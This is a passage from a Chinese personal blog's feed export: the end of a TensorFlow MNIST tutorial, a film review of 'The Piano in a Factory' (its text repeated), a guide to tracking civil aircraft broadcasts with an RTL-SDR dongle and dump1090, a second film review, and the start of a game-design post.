<h3 id="3-计算正确率-1"><a href="#3-计算正确率-1" class="headerlink" title="3. 计算正确率"></a>3. 计算正确率</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">correct_prediction = tf.equal(tf.argmax(y,<span class="number">1</span>),tf.argmax(y_,<span class="number">1</span>))</span><br><span class="line">accuracy = tf.reduce_mean(tf.cast(correct_prediction,tf.float32))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(accuracy.<span class="built_in">eval</span>(&#123;x:mnist.test.images,y_:mnist.test.labels, keep_prob: <span class="number">1.0</span>&#125;))</span><br><span class="line">summary_writer = tf.summary.FileWriter(<span class="string">&#x27;MLP&#x27;</span>, sess.graph)</span><br></pre></td></tr></table></figure>

<pre><code>0.9787
</code></pre>
<h2 id="0x03-CNN"><a href="#0x03-CNN" class="headerlink" title="0x03 CNN"></a>0x03 CNN</h2><h3 id="1-定义变量-2"><a href="#1-定义变量-2" class="headerlink" title="1. 定义变量"></a>1. 定义变量</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">weight_variable</span>(<span class="params">shape</span>):</span></span><br><span class="line">    initial = tf.truncated_normal(shape, stddev=<span class="number">0.1</span>)</span><br><span class="line">    <span class="keyword">return</span> tf.Variable(initial)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bias_variable</span>(<span class="params">shape</span>):</span></span><br><span class="line">    initial = tf.constant(<span class="number">0.1</span>,shape=shape)</span><br><span class="line">    <span class="keyword">return</span> tf.Variable(initial)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">conv2d</span>(<span class="params">x, W</span>):</span></span><br><span class="line">    <span class="keyword">return</span> tf.nn.conv2d(x, W, strides=[<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>], padding=<span class="string">&#x27;SAME&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">max_pool_2x2</span>(<span class="params">x</span>):</span></span><br><span class="line">    <span class="keyword">return</span> tf.nn.max_pool(x, ksize=[<span class="number">1</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">1</span>], strides=[<span class="number">1</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">1</span>], padding=<span class="string">&#x27;SAME&#x27;</span>)</span><br></pre></td></tr></table></figure>


<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">x = tf.placeholder(tf.float32,[<span class="literal">None</span>,in_units])</span><br><span class="line">y_ = tf.placeholder(tf.float32,[<span class="literal">None</span>,<span class="number">10</span>])</span><br><span class="line">x_image = tf.reshape(x, [-<span class="number">1</span>,<span class="number">28</span>,<span class="number">28</span>,<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">W_conv1 = weight_variable([<span class="number">5</span>,<span class="number">5</span>,<span class="number">1</span>,<span class="number">32</span>])</span><br><span class="line">b_conv1 = bias_variable([<span class="number">32</span>])</span><br><span class="line">h_conv1 = tf.nn.relu(conv2d(x_image,W_conv1) + b_conv1)</span><br><span class="line">h_pool1 = max_pool_2x2(h_conv1)</span><br><span class="line"></span><br><span class="line">W_conv2 = weight_variable([<span class="number">5</span>,<span class="number">5</span>,<span class="number">32</span>,<span class="number">64</span>])</span><br><span class="line">b_conv2 = bias_variable([<span class="number">64</span>])</span><br><span class="line">h_conv2 = tf.nn.relu(conv2d(h_pool1, W_conv2) + b_conv2)</span><br><span class="line">h_pool2 = max_pool_2x2(h_conv2)</span><br><span class="line"></span><br><span class="line">W_fc1 = weight_variable([<span class="number">7</span>*<span class="number">7</span>*<span class="number">64</span>, <span class="number">1024</span>])</span><br><span class="line">b_fc1 = bias_variable([<span class="number">1024</span>])</span><br><span class="line">h_pool2_flat = tf.reshape(h_pool2,[-<span class="number">1</span>,<span class="number">7</span>*<span class="number">7</span>*<span class="number">64</span>])</span><br><span class="line">h_fc1 = tf.nn.relu(tf.matmul(h_pool2_flat,W_fc1) + b_fc1)</span><br><span class="line"></span><br><span class="line">keep_prob = tf.placeholder(tf.float32)</span><br><span class="line">h_fc1_drop = tf.nn.dropout(h_fc1,keep_prob)</span><br><span class="line"></span><br><span class="line">W_fc2 = weight_variable([<span class="number">1024</span>, <span class="number">10</span>])</span><br><span class="line">b_fc2 = bias_variable([<span class="number">10</span>])</span><br><span class="line">y_conv = tf.nn.softmax(tf.matmul(h_fc1_drop, W_fc2) + b_fc2)</span><br><span class="line"></span><br><span class="line">cross_entropy = tf.reduce_mean(-tf.reduce_sum(y_ * tf.log(y_conv), reduction_indices=[<span class="number">1</span>]))</span><br><span class="line">train_step = tf.train.AdamOptimizer(<span class="number">1e-4</span>).minimize(cross_entropy)</span><br></pre></td></tr></table></figure>

<h3 id="2-训练-2"><a href="#2-训练-2" class="headerlink" title="2. 训练"></a>2. 训练</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">correct_prediction = tf.equal(tf.arg_max(y_conv,<span class="number">1</span>),tf.argmax(y_,<span class="number">1</span>))</span><br><span class="line">accuracy = tf.reduce_mean(tf.cast(correct_prediction,tf.float32))</span><br><span class="line"></span><br><span class="line">tf.global_variables_initializer().run()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20000</span>):</span><br><span class="line">    batch = mnist.train.next_batch(<span class="number">100</span>)</span><br><span class="line">    <span class="keyword">if</span> i%<span class="number">100</span> == <span class="number">0</span>:</span><br><span class="line">        train_accuracy = accuracy.<span class="built_in">eval</span>(feed_dict=&#123;x:batch[<span class="number">0</span>], y_:batch[<span class="number">1</span>], keep_prob:<span class="number">1.0</span>&#125;)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;step %d, training accuracy %g&quot;</span>%(i,train_accuracy))</span><br><span class="line">    train_step.run(feed_dict=&#123;x:batch[<span class="number">0</span>],y_:batch[<span class="number">1</span>],keep_prob:<span class="number">0.5</span>&#125;)</span><br></pre></td></tr></table></figure>

<pre><code>step 0, training accuracy 0.07
step 100, training accuracy 0.84
step 200, training accuracy 0.9
step 300, training accuracy 0.88
step 400, training accuracy 0.95
step 500, training accuracy 0.98
step 600, training accuracy 0.96
step 700, training accuracy 0.94
step 800, training accuracy 1
step 900, training accuracy 0.98
step 1000, training accuracy 0.99
step 1100, training accuracy 0.96
step 1200, training accuracy 0.99
step 1300, training accuracy 0.99
step 1400, training accuracy 0.98
step 1500, training accuracy 1
step 1600, training accuracy 0.98
step 1700, training accuracy 0.97
step 1800, training accuracy 0.99
step 1900, training accuracy 0.98
step 2000, training accuracy 0.98
step 2100, training accuracy 0.98
step 2200, training accuracy 0.99
step 2300, training accuracy 0.98
step 2400, training accuracy 0.99
step 2500, training accuracy 0.97
step 2600, training accuracy 0.97
step 2700, training accuracy 0.97
step 2800, training accuracy 0.99
step 2900, training accuracy 1
step 3000, training accuracy 1
step 3100, training accuracy 1
step 3200, training accuracy 0.98
step 3300, training accuracy 0.99
step 3400, training accuracy 0.98
step 3500, training accuracy 1
step 3600, training accuracy 1
step 3700, training accuracy 0.98
step 3800, training accuracy 1
step 3900, training accuracy 0.98
step 4000, training accuracy 1
step 4100, training accuracy 0.99
step 4200, training accuracy 0.99
step 4300, training accuracy 0.99
step 4400, training accuracy 1
step 4500, training accuracy 0.99
step 4600, training accuracy 1
step 4700, training accuracy 1
step 4800, training accuracy 1
step 4900, training accuracy 0.98
step 5000, training accuracy 0.99
step 5100, training accuracy 1
step 5200, training accuracy 0.98
step 5300, training accuracy 1
step 5400, training accuracy 1
step 5500, training accuracy 1
step 5600, training accuracy 1
step 5700, training accuracy 1
step 5800, training accuracy 1
step 5900, training accuracy 0.99
step 6000, training accuracy 1
step 6100, training accuracy 1
step 6200, training accuracy 1
step 6300, training accuracy 0.99
step 6400, training accuracy 1
step 6500, training accuracy 0.99
step 6600, training accuracy 1
step 6700, training accuracy 1
step 6800, training accuracy 1
step 6900, training accuracy 0.97

...

step 18500, training accuracy 1
step 18600, training accuracy 1
step 18700, training accuracy 1
step 18800, training accuracy 1
step 18900, training accuracy 1
step 19000, training accuracy 1
step 19100, training accuracy 1
step 19200, training accuracy 1
step 19300, training accuracy 1
step 19400, training accuracy 1
step 19500, training accuracy 1
step 19600, training accuracy 1
step 19700, training accuracy 1
step 19800, training accuracy 1
step 19900, training accuracy 1
</code></pre>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="string">&quot;test accuracy %g&quot;</span>%accuracy.<span class="built_in">eval</span>(feed_dict=&#123;x: mnist.test.images, y_: mnist.test.labels,keep_prob:<span class="number">1.0</span>&#125;)) <span class="comment"># 这一步会瞬间把显存占满</span></span><br><span class="line">summary_writer = tf.summary.FileWriter(<span class="string">&#x27;CNN&#x27;</span>, sess.graph)</span><br></pre></td></tr></table></figure>

<pre><code>test accuracy 0.9931
</code></pre>
<h2 id="0x04-附录"><a href="#0x04-附录" class="headerlink" title="0x04 附录"></a>0x04 附录</h2><h3 id="1-关于reduction-indices"><a href="#1-关于reduction-indices" class="headerlink" title="1. 关于reduction_indices"></a>1. 关于reduction_indices</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">x=[[<span class="number">2</span>,<span class="number">2</span>,<span class="number">2</span>],[<span class="number">2</span>,<span class="number">2</span>,<span class="number">2</span>]]</span><br><span class="line">y0=tf.reduce_sum(x,reduction_indices=[<span class="number">0</span>])</span><br><span class="line">y1=tf.reduce_sum(x,reduction_indices=[<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;x  = &quot;</span>, x)</span><br><span class="line"><span class="keyword">with</span> tf.Session() <span class="keyword">as</span> sess:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;y0 = &quot;</span>, sess.run(y0), <span class="string">&quot;\t(x在第0维度相加)&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;y1 = &quot;</span>, sess.run(y1), <span class="string">&quot;\t(x在第1维度相加)&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<pre><code>x  =  [[2, 2, 2], [2, 2, 2]]
y0 =  [4 4 4]     (x在第0维度相加)
y1 =  [6 6]     (x在第1维度相加)
</code></pre>
]]></content>
      <categories>
        <category>深度学习</category>
      </categories>
      <tags>
        <tag>MNIST</tag>
        <tag>Tensorflow</tag>
      </tags>
  </entry>
  <entry>
    <title>【影像】倒塌的梦想——评电影《钢的琴》</title>
    <url>/post/The_Piano_in_a_Factory/</url>
    <content><![CDATA[<p><img src="http://qiniu.s1nh.org/Blog_The_Piano_in_a_Factory.jpeg-QNthin" alt="The Piano in a Factory"></p>
<p>影片在陈桂林和小菊的离婚商议中拉开帷幕，他们为了孩子的抚养权归谁而站在那里。小菊的身后是一只完整的翅膀，然而陈桂林身后却是一只残破不堪只有骨架的翅膀。紧接着是两根烟囱冒出滚滚浓烟的画面，陈桂林就在这个时候和他的老哥们儿一起被社会抛弃。为了讨生口，他组建了一个办丧礼的小乐队。</p>
<span id="more"></span>

<p>那场葬礼是个喜丧，工人们想吹《三套车》，让老人在冰河上再跑一会，家属们却想要高兴一点的，于是一曲步步高、一个大火球，在巨大工业废墟上搭建起简易的灵堂，我们就这么敲锣打鼓走进了新时代。自此，工人阶级不再是历史的主体，而成了历史的包袱。于是，在工人的物质废墟上，主流的表述又给他们覆盖上一层精神的废墟。工人成了改革开放的废品。社会主义的三十年对于工人来说究竟意味着什么，仅仅是国家资本主义的工业化历程么？他给我们留下怎样的遗产，这些遗产真的死去了么？在这个超现实的集体造钢琴的故事里，蕴藏了许多从历史面向未来的可能性。<br>现实正像片中西方乐器不得不演奏民乐“步步高”的一地鸡毛，原本坚持的东西却如被爆破的工厂烟囱，无论努力拯救与否，它都要坍倒，弥漫起挥之不去的烟尘。</p>
<p>这群被冠以“工人阶级”名号的人们，曾经被捧上天，如今被杀入地，他们作为牺牲品不知道该找谁去诉苦，更不知道该找谁去负责。中国人是务实的，捧上天杀不死他，可断了粮就要出事了。工人们在他们所熟悉的黑土地上的各个角落里辛苦觅食，不再知道自己是什么阶级，而对曾经所属的“工人阶级”和工厂仍旧心存一丝情愫，所以电影里的工人们大多不愿意钢厂的两根烟囱被炸掉，尽管最终炸掉时大家并未表露出悲伤，但他们的脸上分明写满了无奈。两根烟囱在充当了短暂的纪念碑角色后轰然倒下，一起拽倒的是这群人曾经的梦和仅存的念想。</p>
<p>钢的琴的诞生，是这座工厂自计划经济以来重工业辉煌至改革开放后没落的最后一次分娩：当钢琴的创造者们集体以静驻凝视、侧耳倾听的方式对待那本不属于工厂可能发出的清脆声音时，也是对重工业时代的一次默默的送葬：相比之陈桂林老父亲的悄然离去的无声息，因时代变革而走向淘汰的重工业时代就像那两只定向爆破的烟囱，虽曾傲立宇中、万众瞩目，也只能在朗诵、目送和叹息中化为尘埃。</p>
<p>《钢的琴》油画一般的镜头语言让人看到了废旧的东北老工业基地仍旧埋藏着对生活的热情和向往，荒诞幽默的情节激发了惨淡现实下被压抑的生命活力。张猛赋予了工人前所未有的主体性和行动力。他对于工人历史命运的同情，对于工人阶级主体性与尊严的理解，超越了贾樟柯和王兵。痛并快乐的激昂乐曲似乎也正讲述着一个逝去阶层的悲悯情怀和失落，但重要的是，生活还要继续。这部片子中配乐最大的优点在于他用热情、狂欢来描绘现实的残酷、生活的颠簸——他们在动感乐曲中造好了钢琴，也没有留住小元，音乐小孩子似乎已经知道了资本的力量。</p>
<p>俄罗斯风情的配乐在有力地找回那个“工人阶级领导一切”的年代里的感觉，同时又欢快诙谐，不至于让整件凄苦悲凉的事情难以言说。那个基调属于手风琴的钢铁年代，那个旋律属于《山楂树》的工人时代，它并不让人不舍，只是让人难忘，因为那里面透支掉了整整一代人的人生。任他们怎样呼喊“我们工人有力量”，这个时代也听不见了。所以，片中不单是不开窍的“二姐夫”寸步难行，而且劝他要“解放思想”来“解放自己”的陈桂林同样迈不开步，只有依靠自己的小乐队勉强糊口。其他人大同小异，钥匙行、理发部，还有贴着河边走，终究饮湿了鞋的季哥。</p>
<p>电影将焦点放在钢琴上，将视觉母体对准工厂与工人，当某些内地导演忙于抢占道德制高点，行使投机之时，我们要庆幸，张猛选择了他所熟悉的人和事，那座充满感情的工厂和城市。哪怕他站在破败的工厂废墟，也比自称站在喜马拉雅山顶的货色要高大，值得我们去尊敬。因为，这才是一个电影人和创作者的尊严。观者相信，对于心目中的神祗，虔诚的信徒总是颤抖着嘴唇。</p>
<p>陈桂林身后翅膀的骨架终究是残缺的，在代表着一代人热情与汗水的工厂烟囱倒塌时，拽倒的还有他们曾经昂扬的梦想。 影片在陈桂林和小菊的离婚商议中拉开帷幕，他们为了孩子的抚养权归谁而站在那里。小菊的身后是一只完整的翅膀，然而陈桂林身后却是一只残破不堪只有骨架的翅膀。紧接着是两根烟囱冒出滚滚浓烟的画面，陈桂林就在这个时候和他的老哥们儿一起被社会抛弃。为了讨生口，他组建了一个办丧礼的小乐队。</p>
<p>那场葬礼是个喜丧，工人们想吹《三套车》，让老人在冰河上再跑一会，家属们却想要高兴一点的，于是一曲步步高、一个大火球，在巨大工业废墟上搭建起简易的灵堂，我们就这么敲锣打鼓走进了新时代。自此，工人阶级不再是历史的主体，而成了历史的包袱。于是，在工人的物质废墟上，主流的表述又给他们覆盖上一层精神的废墟。工人成了改革开放的废品。社会主义的三十年对于工人来说究竟意味着什么，仅仅是国家资本主义的工业化历程么？他给我们留下怎样的遗产，这些遗产真的死去了么？在这个超现实的集体造钢琴的故事里，蕴藏了许多从历史面向未来的可能性。<br>现实正像片中西方乐器不得不演奏民乐“步步高”的一地鸡毛，原本坚持的东西却如被爆破的工厂烟囱，无论努力拯救与否，它都要坍倒，弥漫起挥之不去的烟尘。</p>
<p>这群被冠以“工人阶级”名号的人们，曾经被捧上天，如今被杀入地，他们作为牺牲品不知道该找谁去诉苦，更不知道该找谁去负责。中国人是务实的，捧上天杀不死他，可断了粮就要出事了。工人们在他们所熟悉的黑土地上的各个角落里辛苦觅食，不再知道自己是什么阶级，而对曾经所属的“工人阶级”和工厂仍旧心存一丝情愫，所以电影里的工人们大多不愿意钢厂的两根烟囱被炸掉，尽管最终炸掉时大家并未表露出悲伤，但他们的脸上分明写满了无奈。两根烟囱在充当了短暂的纪念碑角色后轰然倒下，一起拽倒的是这群人曾经的梦和仅存的念想。</p>
<p>钢的琴的诞生，是这座工厂自计划经济以来重工业辉煌至改革开放后没落的最后一次分娩：当钢琴的创造者们集体以静驻凝视、侧耳倾听的方式对待那本不属于工厂可能发出的清脆声音时，也是对重工业时代的一次默默的送葬：相比之陈桂林老父亲的悄然离去的无声息，因时代变革而走向淘汰的重工业时代就像那两只定向爆破的烟囱，虽曾傲立宇中、万众瞩目，也只能在朗诵、目送和叹息中化为尘埃。</p>
<p>《钢的琴》油画一般的镜头语言让人看到了废旧的东北老工业基地仍旧埋藏着对生活的热情和向往，荒诞幽默的情节激发了惨淡现实下被压抑的生命活力。张猛赋予了工人前所未有的主体性和行动力。他对于工人历史命运的同情，对于工人阶级主体性与尊严的理解，超越了贾樟柯和王兵。痛并快乐的激昂乐曲似乎也正讲述着一个逝去阶层的悲悯情怀和失落，但重要的是，生活还要继续。这部片子中配乐最大的优点在于他用热情、狂欢来描绘现实的残酷、生活的颠簸——他们在动感乐曲中造好了钢琴，也没有留住小元，音乐小孩子似乎已经知道了资本的力量。</p>
<p>俄罗斯风情的配乐在有力地找回那个“工人阶级领导一切”的年代里的感觉，同时又欢快诙谐，不至于让整件凄苦悲凉的事情难以言说。那个基调属于手风琴的钢铁年代，那个旋律属于《山楂树》的工人时代，它并不让人不舍，只是让人难忘，因为那里面透支掉了整整一代人的人生。任他们怎样呼喊“我们工人有力量”，这个时代也听不见了。所以，片中不单是不开窍的“二姐夫”寸步难行，而且劝他要“解放思想”来“解放自己”的陈桂林同样迈不开步，只有依靠自己的小乐队勉强糊口。其他人大同小异，钥匙行、理发部，还有贴着河边走，终究饮湿了鞋的季哥。</p>
<p>电影将焦点放在钢琴上，将视觉母体对准工厂与工人，当某些内地导演忙于抢占道德制高点，行使投机之时，我们要庆幸，张猛选择了他所熟悉的人和事，那座充满感情的工厂和城市。哪怕他站在破败的工厂废墟，也比自称站在喜马拉雅山顶的货色要高大，值得我们去尊敬。因为，这才是一个电影人和创作者的尊严。观者相信，对于心目中的神祗，虔诚的信徒总是颤抖着嘴唇。</p>
<p>陈桂林身后翅膀的骨架终究是残缺的，在代表着一代人热情与汗水的工厂烟囱倒塌时，拽倒的还有他们曾经昂扬的梦想。</p>
]]></content>
      <categories>
        <category>工作笔记</category>
      </categories>
  </entry>
  <entry>
    <title>利用电视棒追踪民航飞机</title>
    <url>/post/Track_Civil_Aircraft/</url>
    <content><![CDATA[<p><img src="http://qiniu.s1nh.org/Blog_Track_Civil_Aircraft_3.png-QNthin"></p>
<p>我国民航飞机的通讯频率为1090MHz，淘宝45块钱买的电视棒（RTL2832U+R820T）接收的频率范围为 24 ~ 1766 MHz. 所以，你应该懂得。</p>
<span id="more"></span>

<p>首先检查一下USB是否正确：</p>
<pre><code>root@kali:~# lsusb 
</code></pre>
<p>如果驱动安装正确，会显示类似如下代码：</p>
<pre><code>Bus 001 Device 002: ID 0bda:2838 Realtek Semiconductor Corp. RTL2838 DVB-T 
</code></pre>
<p>执行下面指令，Clone dump1090：</p>
<pre><code>root@kali:~/sdr# git clone https://github.com/antirez/dump1090.git 
root@kali:~/sdr# cd dump1090/ 
</code></pre>
<p>如果这时执行make命令会提示：</p>
<pre><code>Package librtlsdr was not found in the pkg-config search     path.
Perhaps you should add the directory containing `librtlsdr.pc&#39;
to the PKG_CONFIG_PATH environment variable
No package &#39;librtlsdr&#39; found
cc -O2 -g -Wall -W  -c dump1090.c
dump1090.c:46:21: fatal error: rtl-sdr.h: No such file or directory 
 #include &quot;rtl-sdr.h&quot;
                     ^
compilation terminated.
Makefile:9: recipe for target &#39;dump1090.o&#39; failed
make: *** [dump1090.o] Error 1
</code></pre>
<p>所以，要在make之前执行：</p>
<pre><code>apt-get install librtlsdr-dev
apt-get install libusb-1.0-0-dev
</code></pre>
<p>然后再make就会编译成功啦。这时，执行</p>
<pre><code>root@kali:~/sdr/dump1090# ./dump1090 --interactive --net 
</code></pre>
<p>就会显示如下界面：</p>
<p><img src="http://qiniu.s1nh.org/Blog_Track_Civil_Aircraft_1.png-QNthin" alt="Track Civil Aircraft"></p>
<p>然后用浏览器访问127.0.0.1:8080，也可以用其他电脑访问此虚拟机的8080端口，即可显示航班内容：</p>
<p><img src="http://qiniu.s1nh.org/Blog_Track_Civil_Aircraft_2.png-QNthin" alt="Track Civil Aircraft"></p>
<p>顺便赞一下Google地图的“地形图”图层，好漂亮呀，就像水墨画一样漂亮。（点击左上角的<code>地图－&gt;地形图</code> 即可开启）</p>
<p>注意，Google地图在天朝被墙了，请参照之前的文章用<a href="/post/Lantern/">Lantern</a>翻墙。</p>
<p>参考文献：</p>
<ul>
<li><a href="http://www.92ez.com/?action=show&id=31">RTL-SDR之飞机追踪linux篇</a></li>
<li><a href="http://www.freebuf.com/articles/wireless/77819.html">永不消逝的电波（一）：无线电入门篇</a></li>
<li><a href="http://ju.outofmemory.cn/entry/72852">RTL2832U+R820T电视棒SDR软定义无线电教程</a></li>
</ul>
]]></content>
      <categories>
        <category>信息安全</category>
      </categories>
      <tags>
        <tag>无线电</tag>
      </tags>
  </entry>
  <entry>
    <title>直到迷梦崩塌——评《万物生长》</title>
    <url>/post/UntilDreamCollapses/</url>
    <content><![CDATA[<p>医学系的他们拿着极具喜感的骨头当武器，一场以厚朴一个不小心的摔倒为开始信号的青春的战役在那片明媚阳光下展开。一群不知天高地厚的少年在那个迷人的下午，本以为可以慢慢向微光移去，到最后却累得在地上爽快地大口喘气，动弹不得。抑郁的少年心事，辗转难眠的夜，都在这一场不知究竟为谁而打的架里融化消解。他们满身泥泞，拳头中透露出内心想宣泄而一直被压抑的阴暗和不满，寻求无法用语言所得的平衡，似乎都可以从对方身体上找回了。耳边响着《孤独的人是可耻的》那无奈的回响，观者仿佛能听见少年们的美梦“轰”地一下悄然坍塌，此时，最原始无力的宣泄远胜过语言的一切表达。</p>
<p>这场架就像是秋水青春里的一个分水岭，他同时失去了闪烁的柳青和平凡的白露，他得不到“天上的星星”，也丢失了“尘世的幸福”。观者们就这样跟随着男主人公秋水经历了一场阳光般暖黄中夹杂着晦涩的蓝绿冷色调和迷情却危险的红色相交叠的成长冒险，在摇晃不堪的镜头和情绪性表达里体验着青春离奇，生死别离。</p>
<span id="more"></span>

<p>年少时的友谊，打打闹闹里那些流动的单纯与快乐，还有着一身素衣的白露，就如同秋水记忆里那个初识的小满一般沐浴在那些明亮的色彩下。然而，熟透了的柳青，带着撩人的脸庞和社会的气息闯进了秋水的生活。柳青的出现蒙在一层晦暗色彩的“面纱”下，她撩动了秋水灵魂里的阴暗面，在导演清越蓝色与迷幻红色冲撞交织的布光里，成就了秋水青春里那美丽而迷离的幻梦。秋水自私的记忆里保留着最初的小满那明媚的模样，但实则上，在他所不知道的小满电话的那头，小满同样笼罩在红色和黑色包围的晦暗里。李玉导演利用不同的色调塑造了秋水青春里不同的阶段，并用鲜明的色彩对比刻画出了秋水记忆与现实的反差，其风格化的影像，如同荡漾在一场缱绻迷梦之中。柳青便是那梦。医学系的秋水深夜带柳青偷偷进了医学解剖室，他们面对赤裸的尸体，渴望在福尔马林能浸泡肮脏肉体的玻璃缸前用酒红色的医用酒精洗净他们的灵魂。他们在毫不遮掩的尸体面前，企图毫不遮掩地向对方袒露自己，然而，在那片血红的光照下，柳青与秋水在一晌贪欢后不欢而散。柳青作为“处长们”的情人，逐渐沦为了资本时代的附属品；而秋水则咆哮于柳青“鸡的方式”，试图撬开“大奔屁股”，反抗这个利益熏心的资本时代。这场血红色的邂逅，就在柳青狠狠地给秋水一巴掌后结束，那是他们第一次肉体的靠近，尽管没能如愿。直到小满突然离世，秋水努力维持住的美丽回忆轰然倒塌，柳青再次出现，不同的是，这次她带着万种风情而来。秋水像是抓住了一根救命稻草，与柳青在五光十色的落日前，沙滩上做了一场凄美的幻梦。迷幻，低徊的女声吟唱诉说着他们落日泛着黄色与蓝色的光前朦胧的剪影，以及他们在“沙”与“水”里肉体融合的无奈与欢愉。“沙”和“水”，都是抓不住的东西。导演刻意安排秋水和柳青在“沙”和“水”里交融，实则吻合并铺垫了柳青的离开和她求而不得的纯真，以及秋水一去不复还的青葱岁月。在那段年少岁月里，秋水始终记得小满说的“你是我这个夏天抱的最后一个人”，代表秋水成长岁月的柳青也在沙滩上对秋水重复了同样一句。李玉的别有用心，两句同样言字却出自不同人口中的话，一下子击中了观者灵魂深处那些翻江倒海的回忆，一个年轻男孩真实的青涩，迷失在情欲与情感中的茫然失措就这样跃然屏幕之上。</p>
<p>我们不难发现，除了在对比强烈，感情鲜明的色彩里下尽功夫，李玉的独特影像也来自那不寻常的镜头技巧。主摄影师曾为第六代导演娄烨掌镜，自然为这部影片带来了娄烨气质的晃悠的摄像风格，恰到好处的是，在摇摇晃晃的镜头里，呈现出了一种人物不安，漂泊的特殊美感。如果说原著冯唐的骚情是用尖酸刻薄的语言以及裤裆里的思想激荡，来缅怀某种青春的内心肿胀，那么，李玉的骚情则把小说里那些繁复的下半身思考外化成了一种“迷惘”的镜头运动，承载了人类在荷尔蒙分泌最为旺盛时期的，对于肉体与肉体之间激烈碰撞的强烈渴望，在拍摄两场柳青与秋水的激情戏时便是如此。导演更是大量地在叙事镜头和动作镜头中采用了高速摄影（慢动作）的镜头技巧，来放大了影片中人物动作的异化，如开篇那场考试乱象与少年们打架的那个明媚下午。配合摇晃与高速摄影的镜头，不同于小说的表达方式，导演弱化了影片的故事性，反倒是利用了许多人物脸部的特写镜头极具冲击力地刻画人物的情感。在打在柳青脸上靡曼的红光与摇晃的镜头里，观者看到了柳青的风情和挣扎；在铺陈在秋水侧脸的暗沉阴影和脸部特写镜头里，观者体会到了秋水的无奈和压抑；在照射在白露身上平实的光和与柳青在镜子面前那场脸部对比镜头里，观者闻到了她的稚嫩和偏执；在挥洒在厚朴以及那帮学生脸上明媚的光和高速镜头里，观者触碰到了他们的纯真和张扬……李玉侧重了情绪的表达，用毫无顾忌的嬉闹，肆无忌惮的爱，激烈的争吵，歇斯底里的恨将青春的凶猛展现得淋漓尽致。</p>
<p>导演本人说，这是一场关于成长的宴席。宴终，人散。于是在凶猛之后，一切归于暗淡，若干年后一直见证着他们拥有与失去的宿舍看门的柴胡老大爷终于逝世。他们相聚于那场葬礼，每个人终究变成了自己不曾想过或者是讨厌的样子。在秋水的幻象里，柴胡老大爷似乎对他说：“生即是死，死即是生”。观者的记忆倒带回到电影开篇那夸张的广角镜头下映入眼帘的十六个人头，导演用十六个人头寓意十六个佛珠，意在断除欲界、色界、无色界等三界之烦恼，与柴胡老大爷的“生即逝是死，死即是生”交相呼应。作为医学系的学生，秋水日日接触着生死，而后又经历了小满的离世，迷惘的他最终在生死循环，无色无欲里得到了慰借。在青春的外衣下，影片还探讨了生与死的意义。但遗憾的是，导演却未能在观影时间里讲述清楚她对于生死的透悟。</p>
<p>青春和成长是困扰每一个的人的问题，在《万物生长》里，导演尽力想描述一个成长过程，阐述过去，现在和将来的关系，但小满作为过去，突兀地出现，也唐突地离世和白露，柳青的交织在讲述过程中呈现出一种混沌状态，变成了一个过程的横断面。少了对青涩，对朦胧体验的描述，电影在“肆意生长”里多了一种野蛮。秋水，柳青，白露，小满，厚朴这些人，更像一群渴望抓住青春尾巴的成年人，在面对混乱世界侵蚀时极力的躁动与反抗，想要找回原本的纯真和简单，却在纠葛的现实中无奈放弃。故事的最后，柴胡老大爷离世，葬礼上每个人的内心躁动早已被世俗抚平。我们听见那迷梦坍塌的声音，却未能听见来自未来的希望。</p>
<p>影片的结局，秋水与柳青再次相遇，这是导演李玉对观众青春的一种补偿和馈赠。还是那个迷人的下午，阳光明媚，她拿着我的书坐在餐厅一角，我怔怔地走过去，她认出了我，我们四目相对，微微一笑，仿佛又回到了从前。可终究，柳青是“沙”里“水”挣扎的幻影迷梦，这场相遇分不清是真是假，或是带着内心隐隐作痛的青春，或是不加言语的眼神相对，也或是直到迷梦坍塌后的沉重回响。</p>
]]></content>
      <categories>
        <category>工作笔记</category>
      </categories>
  </entry>
  <entry>
    <title>《行界：零》</title>
    <url>/post/WENT_Zero/</url>
    <content><![CDATA[<blockquote>
<p>“每个成功的合作关系都是如此，完全地、盲目地投入，不计后果，和婚姻一样。否则就是交易。”</p>
</blockquote>
<p><img src="http://qiniu.s1nh.org/Blog_XingjieDesign_8.jpg-QNthin"></p>
<span id="more"></span>

<hr>
<p>游戏的背景是设定在另一个平行世界。</p>
<p>灵感来源是Google实验室的ingress。</p>
<p>这个游戏的设计几乎陪伴了我整个大四，各种地图Api、各种游戏引擎。</p>
<p>整整一个学期的策划，我们一次次的头脑风暴，一次次的推翻。</p>
<p>刚开始我们的设计图还没那么“后摇”，有点日系，有点小清新。好像还起了英文名字《WENT：Went EN Tesseract》</p>
<p><img src="http://qiniu.s1nh.org/Blog_WENT_02.png-QNthin" alt="行界"></p>
<p>当然少不了宣传“小球”——当时我通宵写的代码现在被重构的一行都不剩:(</p>
<p><img src="http://qiniu.s1nh.org/Blog_WENT_01.png-QNthin" alt="行界"></p>
<p>还很幼稚的做了“游戏数值建模”。</p>
<p><img src="http://qiniu.s1nh.org/Blog_WENT_03.png-QNthin" alt="行界"></p>
<p><img src="http://qiniu.s1nh.org/Blog_WENT_05.png-QNthin" alt="行界"></p>
<p><img src="http://qiniu.s1nh.org/Blog_WENT_04.png-QNthin" alt="行界"></p>
